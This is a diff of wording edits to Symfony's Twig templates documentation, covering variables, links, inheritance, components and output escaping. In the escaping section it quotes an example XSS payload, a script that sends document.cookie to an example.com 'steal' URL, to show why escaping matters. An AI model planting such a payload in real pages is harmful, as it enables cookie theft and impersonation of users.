@@ -81,7 +81,7 @@ Creating Templates
 ------------------
 
 Before explaining in detail how to create and render templates, look at the
-following example for a quick overview of the whole process. First, you need to
+following example for a short overview of the whole process. First, you need to
 create a new file in the ``templates/`` directory to store the template contents:
 
 .. code-block:: html+twig
@@ -149,10 +149,10 @@ template directories :ref:`as explained later <templates-namespaces>` in this ar
 Template Variables
 ~~~~~~~~~~~~~~~~~~
 
-A common need for templates is to print the values of the variables
-passed from the controller or service. Variables usually store objects and
+A common need for templates is to print the values of the variables passed
+from the controller or service. Variables usually store objects and
 arrays instead of strings, numbers and boolean values. That's why Twig provides
-quick access to complex PHP variables. Consider the following template:
+direct access to complex PHP variables. Consider the following template:
 
 .. code-block:: html+twig
 
@@ -187,8 +187,8 @@ Linking to Pages
 Instead of writing the link URLs by hand, use the ``path()`` function to
 generate URLs based on the :ref:`routing configuration <routing-creating-routes>`.
 
-Later, if you want to modify the URL of a particular page, all you'll need to do
-is change the routing configuration: the templates will automatically generate
+Later, if you want to modify the URL of a particular page, you only need to
+change the routing configuration: the templates will automatically generate
 the new URL.
 
 Consider the following routing configuration:
@@ -284,7 +284,9 @@ as the first argument and the route parameters as the optional second argument:
 The ``path()`` function generates relative URLs. If you need to generate
 absolute URLs (for example when rendering templates for emails or RSS feeds),
 use the ``url()`` function, which takes the same arguments as ``path()``
-(e.g. ``<a href="{{ url('blog_index') }}"> ... </a>``).
+(e.g. ``<a href="{{ url('blog_index') }}"> ... </a>``). When rendering templates
+outside of an HTTP request (e.g. in console commands), read
+:ref:`how to set the host of absolute URLs <router-generate-urls-commands>`.
 
 .. _templates-link-to-assets:
 
@@ -624,9 +626,9 @@ In practice, the ``base.html.twig`` template would look like this:
     </html>
 
 The `Twig block tag`_ defines the page sections that can be overridden in the
-child templates. They can be empty, like the ``content`` block, or define default
-content, like the ``title`` block, which is displayed when child templates don't
-override them.
+child templates. They can be empty, like the ``content`` block, or define
+default content, like the ``title`` block, which is displayed when child
+templates don't override them.
 
 The ``blog/layout.html.twig`` template could be like this:
 
@@ -666,8 +668,9 @@ but overrides blocks of different parent templates: ``page_contents`` from
 
 When you render the ``blog/index.html.twig`` template, Symfony uses three
 different templates to create the final contents. This inheritance mechanism
-boosts your productivity because each template includes only its unique contents
-and leaves the repeated contents and HTML structure to some parent templates.
+improves your productivity because each template includes only its unique
+contents and leaves the repeated contents and HTML structure to some parent
+templates.
 
 .. warning::
 
@@ -715,10 +718,10 @@ described below for most "reusable UI unit" needs.
 
 For more information, see `UX Twig Component`_.
 
-Twig components also have one other superpower: they can become "live", where
-they automatically update (via Ajax) as the user interacts with them. For example,
-when your user types into a box, your Twig component will re-render via Ajax to
-show a list of results!
+Twig components also have one other powerful feature: they can become "live",
+where they automatically update (via Ajax) as the user interacts with them. For
+example, when your user types into a box, your Twig component will re-render via
+Ajax to show a list of results!
 
 To learn more, see `UX Live Component`_.
 
@@ -864,10 +867,10 @@ Templates can also embed contents asynchronously with the ``hinclude.js``
 JavaScript library.
 
 First, include the `hinclude.js`_ library in your page by
-:ref:`linking to it <templates-link-to-assets>` from the template or by adding it
-to your application JavaScript :doc:`using AssetMapper </frontend>`.
+:ref:`linking to it <templates-link-to-assets>` from the template or by adding
+it to your application JavaScript :doc:`using AssetMapper </frontend>`.
 
-As the embedded content comes from another page (or controller for that matter),
+As the embedded content comes from another page (or controller),
 Symfony uses a version of the standard ``render()`` function to configure
 ``hinclude`` tags in templates:
 
@@ -1110,7 +1113,7 @@ methods::
         }
     }
 
-This might come in handy when dealing with blocks in
+This is useful when handling blocks in
 :ref:`template inheritance <template_inheritance-layouts>` or when using
 `Turbo Streams`_.
 
@@ -1441,7 +1444,7 @@ user name and a malicious user sets the following as their name:
         document.write('<img src="https://example.com/steal?cookie=' + encodeURIComponent(document.cookie) + '" style="display:none;">');
     </script>
 
-You'll see ``My Name`` on screen but the attacker just secretly stole your cookies
+You'll see ``My Name`` on screen but the attacker secretly stole your cookies
 so they can impersonate you on other websites. This is known as a `Cross-Site Scripting`_
 or XSS attack.
 
@@ -1467,6 +1470,9 @@ use the `Twig raw filter`_ to disable the output escaping for that variable:
 
 Read the `Twig output escaping docs`_ to learn more about how to disable output
 escaping for a block or even an entire template.
+
+If the HTML contents come from users, don't use ``raw``. Use the
+:ref:`sanitize_html() filter <html-sanitizer-twig>` instead.
 
 .. _templates-namespaces:
 
@@ -1595,7 +1601,7 @@ Bundle Templates
 
 If you :ref:`install packages/bundles <symfony-flex>` in your application, they
 may include their own Twig templates (in the ``templates/`` directory of each
-bundle). To avoid messing with your own templates, Symfony adds bundle
+bundle). To avoid conflicts with your own templates, Symfony adds bundle
 templates under an automatic namespace named after the bundle.
 
 For example, the templates of a bundle called ``AcmeBlogBundle`` are available
